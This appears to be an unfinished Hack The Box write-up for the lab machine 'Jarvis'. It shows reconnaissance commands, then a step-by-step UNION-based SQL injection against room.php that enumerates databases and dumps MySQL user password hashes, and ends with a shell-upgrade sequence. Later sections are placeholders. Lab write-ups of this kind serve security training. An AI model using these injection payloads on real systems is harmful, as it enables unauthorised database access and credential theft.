# Jarvis

**Links:** [1](https://www.hackthebox.com/machines/Jarvis)  [2](https://app.hackthebox.com/machines/Jarvis)

**Machine ip:** 10.10.10.143

## Reconnaissance
First thing first, start with port scan to see which ports are open and which services are running on those ports.
+ `sudo masscan -p1-65535,U:1-65535 --rate=1000 10.10.10.143 -e tun0 > ports`
+ `ports=$(cat ports | awk -F " " '{print $4}' | awk -F "/" '{print $1}' | sort -n | tr '\n' ',' | sed 's/,$//')`
+ `sudo nmap -Pn -n -sV -sC -O -p$ports 10.10.10.143 --open`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/455ad88c-49a7-4563-9061-697165b520ef)

+ The result shows that 3 tcp ports are open:
```
Port tcp 22: OpenSSH 7.4p1
Port tcp 80: Apache httpd 2.4.25
Port tcp 64999: Apache httpd 2.4.25
```


## Enumeration
+ As usual, always start off with enumerating web server first.
+ Visit the web application.
+ **Firstly**, navigate to `http://10.10.10.143/`, and see the text.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c079fbca-b984-477c-bf02-10070494fc78)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e9bf486d-d84c-4518-872f-96733fa8c68f)

+ There are two discovered domain names. Add **supersecurehotel.htb** and **logger.htb** into the /etc/hosts file.
```
10.10.10.143 supersecurehotel.htb logger.htb
```

+ Both domain names redirect to the same website.
+ Next, view page source, and there's nothing useful.
+ As always, on each web app, start directory fuzzing:
```
gobuster dir -e -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.143/ -k -n -x html,php,txt -r -t 1 --exclude-length 277
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/d111fe65-2ea8-4b72-b000-84f025ce03aa)

+ Check the phpmyadmin directory `http://10.10.10.143/phpmyadmin`.
+ Try to login with default credentials [1](https://codeless.co/phpmyadmin-default-password/) [2](https://forum.terra-master.com/en/viewtopic.php?t=1239) but that didn't work.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2e7fe78c-03be-493e-ab28-c760807965ef)


+ Then visit all the links in the application, and then visit `Rooms & Suites -> Book now!`
+ The **room.php** page takes in a **cod** parameter, and outputs the related room information.
+ `http://10.10.10.143/room.php?cod=5` may be vulnerable to SQL injection. Check later.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/96b77e0c-d506-43d0-94e7-9270c591359b)

+ **Secondly**, navigate to `http://10.10.10.143:64999/`, and see the text.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/c6590eee-698b-4516-84e3-fbbbbff1759f)

+ Then, view page source, and there's nothing.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/2b9cd031-9d75-46b3-b745-7205f63e1071)


## Exploitation
+ Check SQL Injection vulnerability.
+ Add single quotation `'` at the end of **cod** parameter. It doesn't crash the page or return 500, but the picture of the room disappear anymore.
+ No errors appeared since SQL errors may be suppressed. 
+ Try to start by checking for a UNION injection.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1b967f4e-ba2b-4b6a-8025-0146eafa3e45)

+ Add `AND 1=1;-- -` which is always true after **cod**. `-- -` comments out further SQL commands on that line.
+ The page url `http://10.10.10.143/room.php?cod=5%20AND%201=1;--%20-` displays correctly since **1=1** is always true.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/6b4846ec-7931-45f5-9600-2616bad4ace4)

+ Append `AND 1=2;-- -` which is always false after **cod**.
+ The page url `http://10.10.10.143/room.php?cod=5%20AND%201=2;--%20-` doesn't show the room image since **1=2** is always false.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/49b8c89f-1cb7-4ab9-9129-b2fcac25b687)

+ **Alternatively**, try plus sign and minus sign.
+ When trying out math with the **plus** sign nothing changes, and **no** room 5 image gets shown: `http://10.10.10.143/room.php?cod=5+0`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/f08e9136-60d7-4ea2-95e4-6aab4bf51800)
  
+ When using math with a **minus** sign to subtract from the value, it displays that room 5: `http://10.10.10.143/room.php?cod=5-0`

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27faad12-dbec-4ab1-9c6a-1506dabea596)

+ **This means there is some SQL Injection to exploit.**


### Step 1: Column Enumeration
+ The first thing in figuring out the structure of a SQL query is to determine how many columns the query uses.
+ So in order to enumerate the number of columns, incrementally use the ORDER BY keyword until the application either throws an error or no longer gives us a result.
+ **Firstly**, try `order by 7`: `http://10.10.10.143/room.php?cod=5%20order%20by%207`, and get an image.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3e5b781f-a8f7-499b-9859-81dc39344b06)

+ **Secondly**, try `order by 8`: `http://10.10.10.143/room.php?cod=5%20order%20by%208`, and get nothing! **So it means there are exactly 7 columns.** 

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/58315527-422b-454f-a443-ebdd9601c3b7)

+ **Alternatively**, make sure the number of columns match. Add nulls from **once** to **seven** times (**alternatively**, add "1", with or without the quotes or any other number).
+ The box is still blank until seventh. Continue to add nulls until there are seven, then the box reappears.
```
http://10.10.10.143/room.php?cod=5 union select null;-- -
http://10.10.10.143/room.php?cod=5 union select null,null;-- -
.
.
.
.
http://10.10.10.143/room.php?cod=5 union select null,null,null,null,null,null,null;-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1eec0bda-c6d5-4f71-a230-196211f58706)

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/3f80055d-ef9f-44a9-9add-62490ff96f4c)



### Step 2: Testing for Visible Columns Location and Type
+ The next step is to check which of these columns are actually visible (determine which of these columns are getting outputted on the page), and can be injected with the information we exfiltrate from the SQL DB.
+ Let's try the union statement `union select 1,2,3,4,5,6,7`: `http://10.10.10.143/room.php?cod=5%20union%20select%201,2,3,4,5,6,7`
+ That returns the output of the **first** select statement, but not the second. A possible reason is that the application only prints one entry at a time.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/955da967-6643-4138-bd4a-4f61947cdc0d)

+ Specify a non-existent cod value or something similar (test in the URL that it loads nothing first). So let's modify the query with **55 not 5** to give the first select statement a cod value that doesn't exist so that it prints out the result from the second statement.
+ Try `55 union select 1,2,3,4,5,6,7`: `http://10.10.10.143/room.php?cod=55%20union%20select%201,2,3,4,5,6,7`
+ Revealed which columns correspond to the elements in the page.

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/e44c2913-2d8f-4e3a-9ecf-7f030a895a63)

+ Tells us columns 2,3,4,5 are injectible for exfiltration.
+ See that column 5 is the picture, 2 seems to be the room title, 3 must be the price, and 4 must be the description text.
+ The second parameter of the select statement is originally "Classic Double Room", and so the data type of that row is probably string. Maybe work with the second parameter.


### Step 3: Enumerating DBMS Characteristics
+ Try to enumerate the DBMS version, DB files location, current SQL user and current database in use with:
```
http://10.10.10.143/room.php?cod=55%20union%20select%201,@@version,@@datadir,user(),database(),6,7;--%20-
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/eb62cf73-f4b8-409e-8470-1e96c9a11351)

+ Database is MariaDB 10.1.48. Next, tyr to print out the list of password hashes step by step.

+ **List DBs:** List DBs using **group_concat()** which puts all the values from different rows into one string, and concats multiple rows of the same table with one query. Otherwise, you get nothing because of querying more than one column in the sub select query. In order to output multiple columns, you can use the group_concat() function.
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(schema_name),4,5,6,7+from+information_schema.schemata;-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/505dc514-807d-4b4f-917b-2c6481afb3a5)

+ **Show Tables in hotel:** To list the tables in the hotel DB:
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='hotel';-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/221d44c9-2037-47dc-9f76-ce5706a659e0)

+ **Show Columns in room:** Enumerate columns in table room:
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='room';-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/18e3b52f-57d8-474e-ad0c-3d15c5ef9bfd)

+ **Show Tables in mysql:** There are no any usernames or creds in this DB. Control the default mysql DB, and see a lot of tables.
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(table_name),4,5,6,7+from information_schema.tables+where+table_schema='mysql';-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/b1eddaf2-30c6-4f41-8b01-91e65b16afe0)


+ **Show Columns in user:** But just one table, user table is interesting, and enumerate columns in that table with:
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(column_name),4,5,6,7+from+information_schema.columns+where+table_name='user';-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/71ba464b-4c30-40df-aa35-7e572b9b91aa)

+ **Get Username and Password Hashes:** There are some interesting columns, and then enumerate the entries for User, Password adding as data delimiters with:
```
http://10.10.10.143/room.php?cod=55+union+select+1,2,group_concat(User,":",Password),4,5,6,7+from+mysql.user;-- -

http://10.10.10.143/room.php?cod=55+union+select+1,2,(SELECT group_concat(user,":",password) FROM mysql.user),4,5,6,7;-- -
```

![image](https://github.com/h4md153v63n/CTFs/assets/5091265/982a4737-3951-4842-9cf8-5cba91bff2d8)



+ x
```
DBadmin:*2D2B7A5E4E637B8FBA1D17F40318F277D29964D0
```




## Gaining Access
+ xxx



### Shell Upgrade
+ We have partially interactive bash shell. Upgrade it to get a fully interactive shell, do more stable with a better shell.
```
python -c 'import pty; pty.spawn("/bin/bash")'
script /dev/null -c bash
CTRL^Z: Ctrl + Z
stty raw -echo; fg
reset
terminal type? 'screen' or 'xterm'
export TERM=xterm  
export SHELL=bash
stty rows 55 columns 285
```



## Privilege Escalation
+ Escalate privileges to get the root flag.




# Technical Knowledge
+ xxx


# CVE Scripting
+ xxx


# References & Alternatives
+ https://vvmlist.github.io/#jarvis
+ https://ivanitlearning.wordpress.com/2020/10/14/hackthebox-jarvis/
+ https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/linux-boxes/jarvis-writeup-w-o-metasploit
+ https://0xdf.gitlab.io/2019/11/09/htb-jarvis.html
+ https://medium.com/@toneemarqus/jarvis-htb-manual-walkthrough-2023-oscp-prep-a8ea5df0587c
+ https://github.com/Kyuu-Ji/htb-write-up/blob/master/jarvis/write-up-jarvis.md
+ xxx


# For More
+ xxx

